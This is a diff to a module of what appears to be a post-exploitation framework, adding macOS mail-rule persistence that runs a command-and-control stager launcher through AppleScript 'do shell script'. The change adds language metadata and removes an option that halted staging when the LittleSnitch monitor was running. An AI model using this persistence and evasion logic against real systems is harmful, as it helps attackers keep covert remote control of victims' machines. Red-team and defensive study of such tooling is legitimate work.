@@ -28,6 +28,12 @@ class Module:
             # True if the method doesn't touch disk/is reasonably opsec safe
             'OpsecSafe' : False,
 
+            # the module language
+            'Language': 'python',
+
+            # the minimum language version needed
+            'MinLanguageVersion': '2.6',
+
             # list of any references/other comments
             'Comments': ['https://github.com/n00py/MailPersist']
         }
@@ -46,11 +52,6 @@ class Module:
                 'Description'   :   'Listener to use.',
                 'Required'      :   True,
                 'Value'         :   ''
-            },
-            'LittleSnitch' : {
-                'Description'   :   'Switch. Check for the LittleSnitch process, exit the staging process if it is running. Defaults to True.',
-                'Required'      :   True,
-                'Value'         :   'True'
             },
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
@@ -90,8 +91,7 @@ class Module:
         trigger = self.options['Trigger']['Value']
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
-        LittleSnitch = self.options['LittleSnitch']['Value']
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent, littlesnitch=LittleSnitch)
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent)
         launcher = launcher.replace('"', '\\"')
         launcher = launcher.replace('"', '\\"')
         launcher = "do shell script \"%s\"" % (launcher)
